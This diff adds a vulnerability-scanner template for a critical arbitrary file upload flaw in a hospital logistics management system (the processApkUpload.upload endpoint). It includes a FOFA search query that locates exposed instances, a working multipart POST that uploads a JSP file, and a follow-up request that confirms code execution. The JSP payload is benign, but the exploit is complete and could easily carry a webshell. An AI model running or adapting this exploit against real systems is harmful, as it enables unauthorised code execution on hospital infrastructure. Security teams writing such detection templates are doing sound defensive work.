@@ -1,0 +1,37 @@
+## id: VEID-2024-0602
+## name: 医院一站式后勤管理系统processApkUpload.upload存在任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2024
+## description: J医院一站式后勤管理系统processApkUpload.upload存在任意文件上传漏洞导致rce
+## fofa-query: body="frameworkModuleJob" | body="版权所有：南京博纳睿通软件科技有限公司"
+## verification: true
+
+
+
+POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+Content-Disposition: form-data; name="Filedata"; filename="a.jsp"
+Content-Type: application/octet-stream
+
+<% out.print("hello veil"); %>
+------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
+
+#@ matcher: status_code == 200
+
+
+---
+
+GET /a.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ matcher: body contains "hello veil"
+
+
+
+# @VEIL-STAMP: fdc5eca2ac768f72c4608683981d7bc6d9fae491e116c31a1b2e0f0f23a5fba1
